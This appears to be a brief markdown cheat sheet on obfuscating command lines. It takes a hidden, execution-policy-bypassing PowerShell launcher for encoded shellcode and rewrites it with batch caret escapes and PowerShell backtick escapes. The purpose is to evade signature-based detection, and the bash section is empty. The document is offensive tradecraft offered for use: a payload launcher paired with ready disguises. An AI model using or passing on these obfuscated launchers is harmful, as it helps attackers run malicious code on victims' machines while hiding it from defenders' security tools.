<br />

# SIMPLE STRING OBFUSCATION TECNICS

<br /><br />

### batch

- string command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
The above string can be obfuscated using the **batch escape caracter** ^<br />

- string obfuscated<br />
`cm^d.e^xe /c po^w^er^shel^l.ex^e -n^op -w^i^nd h^idd^en -Ex^e^c B^yp^a^ss -no^n^i -en^c $shellcode`<br />

---

<br />

### bash


---

<br />

### powershell

- string command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
The above string can be obfuscated using the **powershell escape caracter** `<br />

- string obfuscated<br />
cm\`d.e\`xe /c po\`w\`er\`shel\`l.ex\`e -n\`op -w\`i\`nd h\`idd\`en -Ex\`e\`c B\`yp\`a\`ss -no\`n\`i -en\`c $shellcode<br />

---

<br />
